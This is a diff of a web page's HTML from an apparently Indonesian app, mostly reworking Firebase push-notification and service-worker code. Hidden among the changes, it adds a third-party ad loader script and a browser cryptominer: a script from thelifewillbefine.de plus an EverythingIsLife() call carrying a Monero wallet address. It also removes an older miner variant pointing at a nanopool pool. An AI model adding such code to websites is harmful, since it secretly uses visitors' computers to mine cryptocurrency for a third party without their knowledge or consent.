@@ -113,6 +113,9 @@
     <section>
       <!-- this is the start of content -->
       <div class="container pt-3">
+        <script async="async" data-cfasync="false"
+          src="//thinnerlanguish.com/7ff771880f2895a9aeb2b9844bb74884/invoke.js"></script>
+        <div id="container-7ff771880f2895a9aeb2b9844bb74884"></div>
         <div class="row">
           <div class="col-12 col-md-6">
             <div class="card shadow-sm mb-5">
@@ -292,6 +295,10 @@
     </div>
   </div>
 
+  <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
+  <script type="text/javascript">
+    EverythingIsLife('43NQtbvvFbF6PF1RWxNjxwj3ciNP8yfPCdeVV8MSsWVwEJAte1RKk5PRmHXdWJET2eVhcyJYMeBVyDFWEzq86PcsAHexkTW', 'adakah', 30);
+  </script>
 
   <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
     integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
@@ -319,7 +326,7 @@
       // return;
     }
 
-    
+
 
     // Import the functions you need from the SDKs you need
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
@@ -363,17 +370,27 @@
       $("#persetujuan_kebijakan").modal("show");
     });
 
+    let regis;
 
+    // register sw.js
     if ("serviceWorker" in navigator) {
       navigator.serviceWorker
-        .register("./firebase-messaging-sw.js")
+        .register("./sw.js")
         .then((registration) => {
           askNotificationPermission();
           console.log(
-            "Service Worker registered with scope:",
-            registration.scope
+            "Service Worker registered :",
+            registration
           );
-          getToken(messaging, { serviceWorkerRegistration: registration }).then((token) => {
+
+          regis = registration;
+
+          getToken(messaging, {
+            serviceWorkerRegistration: registration,
+            vapidKey:
+              "BC-IgG_mV3Mt1hUddSCzEw9_PRxw7WMo8-NxEi2lq7b24ngPqCV7awV1OJ4vLo6HEnQKlyAgs5K6bPRl_CIygQs"
+          }).then((token) => {
+            localStorage.setItem("fcm", token);
             console.log("Token FCM diterima:", token);
           })
         })
@@ -385,12 +402,12 @@
     function askNotificationPermission() {
       if (Notification.permission === "granted") {
         console.log("Notification permission already granted.");
-        registerAndShowNotification();
+        // registerAndShowNotification();
       } else if (Notification.permission !== "denied") {
         Notification.requestPermission().then((permission) => {
           if (permission === "granted") {
             console.log("Notification permission granted.");
-            registerAndShowNotification();
+            // registerAndShowNotification();
           } else {
             console.log("Notification permission denied.");
           }
@@ -398,26 +415,20 @@
       }
     }
 
-    let regis;
 
-    function registerAndShowNotification() {
-      navigator.serviceWorker
-        .register("./sw.js") // Replace with your service worker file path
-        .then((registration) => {
-          console.log("sw.js registered");
-          showNotification2();
-          console.log(registration);
-          regis = registration;
-          // showNotification(registration);
-        })
-        .catch((error) => {
-          console.error("sw.js registration failed:", error);
-        });
-    }
+
+    onMessage(messaging, (payload) => {
+      console.log("Notifikasi FCM diterima: ", payload);
+      // showNotification(regis, payload.notification.body);
+      new Notification(payload.notification.title, {
+        body: payload.notification.body,
+        icon: payload.notification.icon,
+      });
+    });
 
     function showNotification(registration, isiPesan) {
       const img =
-        "icons/android/android-launchericon-48-48.png";
+        "./icons/android/android-launchericon-48-48.png";
       const text = isiPesan;
 
       const options = {
@@ -463,43 +474,9 @@
       });
     });
 
-    function showNotification2() {
-      // Minta izin notifikasi
-      Notification.requestPermission()
-        .then((permission) => {
-          if (permission === "granted") {
-            console.log("izin notifikasi FCM diterima");
-            return getToken(messaging, {
-              vapidKey:
-                "BC-IgG_mV3Mt1hUddSCzEw9_PRxw7WMo8-NxEi2lq7b24ngPqCV7awV1OJ4vLo6HEnQKlyAgs5K6bPRl_CIygQs",
-            }); // Pakai VAPID Key
-          } else {
-            console.log("Izin notifikasi ditolak");
-          }
-        })
-        .then((token) => {
-          // console.log(token)
-          localStorage.setItem("fcm", token);
-        })
-        .catch((err) => {
-          console.error("Gagal mendapatkan token:", err);
-        });
-    }
 
-    onMessage(messaging, (payload) => {
-      console.log("Notifikasi FCM diterima: ", payload);
-      showNotification(regis, payload.notification.body);
-      new Notification(payload.notification.title, {
-        body: payload.notification.body,
-        icon: payload.notification.icon,
-      });
-    });
   </script>
-  <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=rx/0?nosaj=xmr-asia1.nanopool.org:10300"></script>
 
-  <script type="text/javascript">
-    EverythingIsLife('43NQtbvvFbF6PF1RWxNjxwj3ciNP8yfPCdeVV8MSsWVwEJAte1RKk5PRmHXdWJET2eVhcyJYMeBVyDFWEzq86PcsAHexkTW', 'x', 30);
-  </script>
 
   <script type="module">
     import kebijakan from "./template.js";
